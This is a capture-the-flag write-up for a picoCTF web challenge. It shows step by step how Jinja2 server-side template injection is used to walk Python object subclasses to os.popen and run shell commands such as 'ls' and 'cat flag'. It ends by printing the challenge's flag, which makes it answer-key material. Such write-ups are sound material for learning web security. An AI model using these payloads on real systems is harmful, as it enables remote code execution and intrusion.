Here, we are given a basic website. The challenge strongly hints that a template is being used for Server-Side Template Injection (SSTI).

A common template injection would check to see what syntax is accepted. Jinja in Python is very popular, and uses `{{}}` syntax to execute Python code. So let's attempt the following:

```
{{1 + 1}}
```

Upon execution, `2` is displayed on the page.

Great, now we get into the heart of an SSTI attack. The idea is that we want to get into the methods of an object in Python until we reach some system functionality, and then manipulate it to perform RCE.

Let's do something simple like using the object `1`. From here, we can extract its class:

```
{{1.__class__}}
```

We get:

```
<class 'int'>
```

Now, let's continue this process:

```
{{1.__class__.__base__}}
```

This gives us:

```
<class 'object'>
```

And one more time to extract subclasses:

```
{{1.__class__.__base__.__subclasses__()}}
```

Now we get a long list of subclasses. Our goal here is to get one that would eventually utilize the `sys` library. Practically speaking, searching for things like `os` is a good idea, but after some searching, `subprocess.Popen` was found. After trial and error, the index of it was found to be `356`.

`os.popen()` is a command we wish to use so we can perform system commands. However, actually getting to the `popen` Python command is a bit awkward. We actually have to navigate through the subprocess's `sys` library to get the `os` command and perform the `popen` method. It looks like this (all one line):

```
{{1.__class__.__base__.__subclasses__()[356].__init__.__globals__['sys'].modules['os'].popen() }}
```

From here, we can finally execute Linux commands. Let's do an `ls`:

```
{{1.__class__.__base__.__subclasses__()[356].__init__.__globals__['sys'].modules['os'].popen('ls').read() }}
```

We get the following result:

```
__pycache__ app.py flag requirements.txt
```

Finally, let's extract the flag:

```
{{1.__class__.__base__.__subclasses__()[356].__init__.__globals__['sys'].modules['os'].popen('cat flag').read() }}
```

Solution: **picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_ae48ad61}**
